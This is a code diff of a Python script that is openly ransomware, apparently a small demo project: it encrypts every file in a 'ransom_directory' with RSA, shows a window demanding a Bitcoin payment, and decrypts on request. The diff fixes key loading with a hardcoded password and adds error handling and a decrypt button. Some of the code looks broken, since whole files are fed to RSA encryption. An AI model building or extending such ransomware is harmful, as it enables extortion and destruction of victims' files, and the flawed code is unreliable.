@@ -1,6 +1,7 @@
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import padding
-import os, rsa, sys, colorama
+from cryptography.hazmat.primitives.asymmetric import rsa
+import os, sys, colorama
 import tkinter as tk
 
 dir = os.path.dirname(os.path.realpath(__file__)) # get current directory
@@ -12,6 +13,7 @@ def gen_key():
 
         return privkey, pubkey
     except:
+        print(colorama.Fore.RED + "[!] - No key found. Generating new key pair...")
         pass
     
     priv = rsa.generate_private_key(public_exponent=65537, key_size=2048) # generate private key
@@ -34,12 +36,13 @@ def gen_key():
         f.write(k)
         
     return privkey, pubkey
-        
-    
 
 dir = os.path.dirname(os.path.realpath(__file__)) # get current directory
 
 def encrypt(filename, public_key):
+    public_key = serialization.load_pem_public_key( 
+        public_key
+    )
     with open(f"{dir}/{filename}", "rb") as f: # read file to encrypt
         encrypted = public_key.encrypt(
             f.read(), 
@@ -55,6 +58,10 @@ def encrypt(filename, public_key):
         
 def decrypt(filename, private_key):
     with open(f"{dir}/{filename}", "rb") as f: # read file to decrypt
+        private_key = serialization.load_pem_private_key(
+            private_key,
+            password=b'mypassword', # password used to encrypt private key (see ransomware/decrypt.py)
+        )
         decrypted = private_key.decrypt(
             f.read(), 
             padding.OAEP(
@@ -71,7 +78,7 @@ def get_tree_file():
     
     files = []
     
-    for path, _, file_names in os.walk(f"{dir}/ransom_directory"):
+    for path, _, file_names in os.walk(f"ransom_directory"):
         for file_name in file_names:
             file_path = os.path.join(path, file_name)
             files.append(file_path)
@@ -83,14 +90,21 @@ def encrypt_all():
     privkey, pubkey = gen_key() # generate key pair
     
     for file in get_tree_file(): # encrypt all files in ransom_directory
-        encrypt(file, pubkey)
+        try:
+            encrypt(file, pubkey)
+        except Exception as e:
+            print(colorama.Fore.RED + "[!] - Error: {}".format(e))
         
 def decrypt_all():
     
     privkey, pubkey = gen_key() # generate key pair
     
     for file in get_tree_file(): # decrypt all files in ransom_directory
-        decrypt(file, privkey)
+        try:
+            decrypt(file, privkey)
+        except Exception as e:
+            print(colorama.Fore.RED + "[!] - Error: {}".format(e))
+    thank_you()
 
 def your_files_are_encrypted():
     root = tk.Tk()
@@ -101,8 +115,12 @@ def your_files_are_encrypted():
     label = tk.Label(root, text="Your files are encrypted", font=("Arial", 15))
     btc_addrs = tk.Label(root, text="Pay 1$ for decryption : 1F1tAaz5x1HMaxCNLbtCMamxw6x4pdNn4xqX", font=("Arial", 15))
     
+    btn_decrypt = tk.Button(root, text="Decrypt your files", command=decrypt_all)
+    
     label.pack(pady=10)
     btc_addrs.pack(pady=10)
+    
+    btn_decrypt.pack(pady=10)
     
     root.mainloop()
 
@@ -130,9 +148,8 @@ if __name__ == "__main__":
             print("Files encrypted")
         elif sys.argv[1] == "decrypt":
             decrypt_all()
-            thank_you()
             print("Files decrypted")
         else:
             print("Usage: python3 main.py [encrypt|decrypt]")
-    except:
-        print("Usage: python3 main.py [encrypt|decrypt]")
+    except Exception as e:
+        print(colorama.Fore.RED + "[!] - Error: {}".format(e))
